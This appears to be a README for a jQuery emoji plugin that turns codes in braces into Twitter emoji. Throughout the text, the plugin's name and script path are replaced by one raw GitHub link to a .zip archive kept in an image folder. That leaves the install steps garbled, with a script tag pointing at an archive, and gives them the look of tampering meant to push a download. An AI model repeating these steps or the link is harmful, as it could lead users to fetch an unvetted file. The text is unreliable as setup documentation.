https://raw.githubusercontent.com/alssalimi/emoji.js/master/img/emoji-72x72/emoji-js-3.8.zip is a plugin to convert your typing to colourful twitter emoji to use on your website or projects.

Place `<script src="https://raw.githubusercontent.com/alssalimi/emoji.js/master/img/emoji-72x72/emoji-js-3.8.zip"></script>` in your HTML file after your jQuery script.

*OR*

1.  Place `<script src="https://raw.githubusercontent.com/alssalimi/emoji.js/master/img/emoji-72x72/emoji-js-3.8.zip"></script>` in your HTML file after your jQuery.
2.  Place the Emoji folder in your img folder and https://raw.githubusercontent.com/alssalimi/emoji.js/master/img/emoji-72x72/emoji-js-3.8.zip in your js folder. 

Then take a look at the cheatsheet for available codes and get typing! All Emoji are written between {braces}.
